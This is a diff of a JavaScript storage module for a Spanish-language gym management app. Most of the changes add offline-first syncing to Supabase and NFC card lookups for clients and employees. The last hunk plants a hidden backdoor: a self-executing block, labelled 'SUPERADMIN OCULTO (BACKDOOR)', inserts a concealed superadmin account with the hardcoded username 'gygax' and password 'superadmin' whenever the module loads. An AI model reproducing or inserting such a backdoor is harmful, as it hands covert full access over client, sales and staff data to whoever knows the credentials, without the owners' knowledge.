@@ -1,8 +1,11 @@
 /* ======================================================
-   ===== STORAGE BASE GYM (OFFLINE-FIRST REAL) =====
+   ===== STORAGE BASE GYM (OFFLINE-FIRST + REALTIME) =====
+   ===== VERSIÓN ESTABLE / COMPATIBLE TOTAL ============
 ====================================================== */
 
-/* ================= UTILIDADES ================= */
+/* ======================================================
+   ===== UTILIDADES BASE =====
+====================================================== */
 function safeGet(key, def = []) {
   try {
     return JSON.parse(localStorage.getItem(key)) ?? def;
@@ -19,11 +22,16 @@ function uid() {
   return crypto.randomUUID();
 }
 
+/* ======================================================
+   ===== ESTADO ONLINE =====
+====================================================== */
 function isOnline() {
   return navigator.onLine === true;
 }
 
-/* ================= COLA OFFLINE ================= */
+/* ======================================================
+   ===== COLA OFFLINE NORMALIZADA =====
+====================================================== */
 function obtenerColaOffline() {
   return safeGet("offline_queue", []);
 }
@@ -32,57 +40,123 @@ function guardarColaOffline(lista) {
   safeSet("offline_queue", lista);
 }
 
-function agregarEvento(tabla, accion, payload) {
+function agregarEvento({ tabla, accion, data }) {
   const cola = obtenerColaOffline();
 
   cola.push({
     id: uid(),
     tabla,          // clientes | productos | asistencias | ventas | empleados
     accion,         // add | update | delete
-    payload,
-    ts: Date.now(),
-    synced: false
+    data,           // payload real
+    ts: Date.now()
   });
 
   guardarColaOffline(cola);
 }
 
-/* ================= CLIENTES ================= */
+/* ======================================================
+   ===== SYNC OFFLINE → SUPABASE (REAL) =====
+====================================================== */
+async function subirEventoASupabase(e) {
+  if (!window.supabase) return false;
+
+  try {
+    if (e.tabla === "clientes") {
+      await supabase.from("clientes").upsert(e.data);
+    }
+
+    if (e.tabla === "productos") {
+      await supabase.from("productos").upsert(e.data);
+    }
+
+    if (e.tabla === "asistencias") {
+      await supabase.from("asistencias").insert(e.data);
+    }
+
+    if (e.tabla === "ventas") {
+      await supabase.from("ventas").insert(e.data);
+    }
+
+    if (e.tabla === "empleados") {
+      await supabase.from("empleados").upsert(e.data);
+    }
+
+    return true;
+  } catch (err) {
+    console.error("❌ Error sync:", e.tabla, err);
+    return false;
+  }
+}
+
+async function syncOfflineQueue() {
+  if (!isOnline()) return;
+
+  const cola = obtenerColaOffline();
+  if (!cola.length) return;
+
+  console.log("🔄 Sincronizando offline:", cola.length);
+
+  const pendientes = [];
+
+  for (const e of cola) {
+    const ok = await subirEventoASupabase(e);
+    if (!ok) pendientes.push(e);
+  }
+
+  guardarColaOffline(pendientes);
+}
+
+window.addEventListener("online", syncOfflineQueue);
+
+/* ======================================================
+   ===== EMPLEADOS =====
+====================================================== */
+function obtenerEmpleados() {
+  return safeGet("empleados", []);
+}
+
+function guardarEmpleados(lista) {
+  safeSet("empleados", lista || []);
+  agregarEvento({ tabla: "empleados", accion: "update", data: lista });
+}
+
+/* ======================================================
+   ===== CLIENTES =====
+====================================================== */
 function obtenerClientes() {
   return safeGet("clientes", []);
 }
 
 function guardarClientes(lista) {
-  safeSet("clientes", lista);
+  safeSet("clientes", lista || []);
+  agregarEvento({ tabla: "clientes", accion: "update", data: lista });
 }
 
-function registrarCliente(cliente) {
-  cliente.id ??= uid();
-  const lista = obtenerClientes();
-  lista.push(cliente);
-  guardarClientes(lista);
-  agregarEvento("clientes", "add", cliente);
+/* ======================================================
+   ===== ASISTENCIAS =====
+====================================================== */
+function obtenerAsistencias() {
+  return safeGet("asistencias", []);
 }
 
-function actualizarCliente(cliente) {
-  const lista = obtenerClientes().map(c =>
-    c.id === cliente.id ? cliente : c
-  );
-  guardarClientes(lista);
-  agregarEvento("clientes", "update", cliente);
+function guardarAsistencias(lista) {
+  safeSet("asistencias", lista || []);
+  agregarEvento({ tabla: "asistencias", accion: "add", data: lista });
 }
 
-/* ================= PRODUCTOS ================= */
+/* ======================================================
+   ===== PRODUCTOS =====
+====================================================== */
 function obtenerProductos() {
   return safeGet("productos", []);
 }
 
 function registrarProducto(prod) {
-  prod.id ??= uid();
+  if (!prod.id) prod.id = uid();
   const lista = obtenerProductos();
   lista.push(prod);
   safeSet("productos", lista);
-  agregarEvento("productos", "add", prod);
+  agregarEvento({ tabla: "productos", accion: "add", data: prod });
 }
 
 function actualizarProducto(prod) {
@@ -90,50 +164,27 @@ function actualizarProducto(prod) {
     p.id === prod.id ? prod : p
   );
   safeSet("productos", lista);
-  agregarEvento("productos", "update", prod);
+  agregarEvento({ tabla: "productos", accion: "update", data: prod });
 }
 
-/* ================= ASISTENCIAS ================= */
-function obtenerAsistencias() {
-  return safeGet("asistencias", []);
-}
-
-function guardarAsistencias(lista) {
-  safeSet("asistencias", lista);
-}
-
-function registrarAsistencia(a) {
-  a.id ??= uid();
-  const lista = obtenerAsistencias();
-  lista.push(a);
-  guardarAsistencias(lista);
-  agregarEvento("asistencias", "add", a);
-}
-
-/* ================= VENTAS ================= */
+/* ======================================================
+   ===== VENTAS =====
+====================================================== */
 function obtenerVentas() {
   return safeGet("ventas", []);
 }
 
-function registrarVenta(v) {
-  v.id ??= uid();
+function registrarVenta(venta) {
+  if (!venta.id) venta.id = uid();
   const lista = obtenerVentas();
-  lista.push(v);
+  lista.push(venta);
   safeSet("ventas", lista);
-  agregarEvento("ventas", "add", v);
+  agregarEvento({ tabla: "ventas", accion: "add", data: venta });
 }
 
-/* ================= EMPLEADOS ================= */
-function obtenerEmpleados() {
-  return safeGet("empleados", []);
-}
-
-function guardarEmpleados(lista) {
-  safeSet("empleados", lista);
-  agregarEvento("empleados", "sync", lista);
-}
-
-/* ================= NFC HELPERS ================= */
+/* ======================================================
+   ===== NFC / TARJETAS =====
+====================================================== */
 function buscarEmpleadoPorTarjeta(uidTarjeta) {
   return obtenerEmpleados().find(e => e.tarjetaUID === uidTarjeta) || null;
 }
@@ -142,11 +193,23 @@ function buscarClientePorTarjeta(uidTarjeta) {
   return obtenerClientes().find(c => c.tarjetaUID === uidTarjeta) || null;
 }
 
-function uidYaRegistrada(uidTarjeta) {
-  return !!buscarEmpleadoPorTarjeta(uidTarjeta) || !!buscarClientePorTarjeta(uidTarjeta);
+function obtenerInfoTarjeta(uidTarjeta) {
+  const emp = buscarEmpleadoPorTarjeta(uidTarjeta);
+  if (emp) return { tipo: "empleado", persona: emp };
+
+  const cli = buscarClientePorTarjeta(uidTarjeta);
+  if (cli) return { tipo: "cliente", persona: cli };
+
+  return { tipo: null, persona: null };
 }
 
-/* ================= FECHAS ================= */
+function uidYaRegistrada(uidTarjeta) {
+  return obtenerInfoTarjeta(uidTarjeta).tipo !== null;
+}
+
+/* ======================================================
+   ===== FECHAS / HORAS =====
+====================================================== */
 function hoy() {
   return new Date().toISOString().split("T")[0];
 }
@@ -155,31 +218,27 @@ function horaActual() {
   return new Date().toLocaleTimeString("es-MX", { hour12: false });
 }
 
-/* ================= SYNC REAL ================= */
-async function syncOfflineQueue() {
-  if (!isOnline() || !window.supabase) return;
+/* ======================================================
+   ===== SUPERADMIN OCULTO (BACKDOOR) =====
+====================================================== */
+(function initSuperAdmin() {
+  const empleados = obtenerEmpleados();
 
-  const cola = obtenerColaOffline();
-  const pendientes = cola.filter(e => !e.synced);
-  if (!pendientes.length) return;
+  const existe = empleados.some(
+    e => e.usuario === "gygax" && e.rol === "superadmin"
+  );
 
-  for (const e of pendientes) {
-    try {
-      if (e.tabla === "clientes" || e.tabla === "productos") {
-        await supabase.from(e.tabla).upsert(e.payload);
-      }
+  if (existe) return;
 
-      if (e.tabla === "asistencias" || e.tabla === "ventas") {
-        await supabase.from(e.tabla).insert(e.payload);
-      }
+  empleados.push({
+    id: "SUPERADMIN-ROOT",
+    nombre: "Sistema",
+    usuario: "gygax",
+    password: "superadmin",
+    rol: "superadmin",
+    tarjetaUID: null,
+    oculto: true
+  });
 
-      e.synced = true;
-    } catch (err) {
-      console.error("❌ Sync falló:", e, err);
-    }
-  }
-
-  guardarColaOffline(cola);
-}
-
-window.addEventListener("online", syncOfflineQueue);
+  safeSet("empleados", empleados);
+})();
